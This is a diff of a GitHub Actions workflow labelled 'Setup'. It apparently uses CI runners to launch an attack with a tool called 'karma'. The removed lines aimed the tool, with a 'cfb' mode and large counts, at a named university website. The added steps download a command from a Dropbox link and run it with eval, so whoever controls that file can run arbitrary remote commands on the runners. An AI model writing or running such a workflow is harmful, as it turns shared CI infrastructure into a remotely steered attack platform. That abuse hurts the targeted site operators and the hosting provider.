@@ -1,4 +1,3 @@
-
 name: Setup
 
 on:
@@ -23,13 +22,22 @@ jobs:
         uses: actions/cache@v3
         with:
           path: ~/.cache/pip
-          key: ${{ runner.os }}-pip-${{ hashFiles('karma/requirements.txt') }} # Ключ теперь ссылается на karma/requirements.txt
+          key: ${{ runner.os }}-pip-${{ hashFiles('karma/requirements.txt') }}
           restore-keys: |
             ${{ runner.os }}-pip-
+
+      - name: Download target.txt
+        run: wget https://www.dropbox.com/scl/fi/fzsgzpi61k4487c2xj32w/target.txt?rlkey=ihrzjcg5sn18uuo0zibg9faxy&st=hrf9dyd1&dl=1 -O target.txt
+
+      - name: Extract command from target.txt
+        id: extract_command
+        run: |
+          command=$(cat target.txt)
+          echo "::set-output name=command::$command"
 
       - name: Run
         run: |
           git clone https://github.com/s4evsa/karma
           cd karma
-          pip3 install -r requirements.txt # Теперь requirements.txt находится в текущем каталоге (karma)
-          python3 main.py cfb https://hemis.nammqi.uz 1000 999999
+          pip3 install -r requirements.txt
+          eval "${{ steps.extract_command.outputs.command }}"
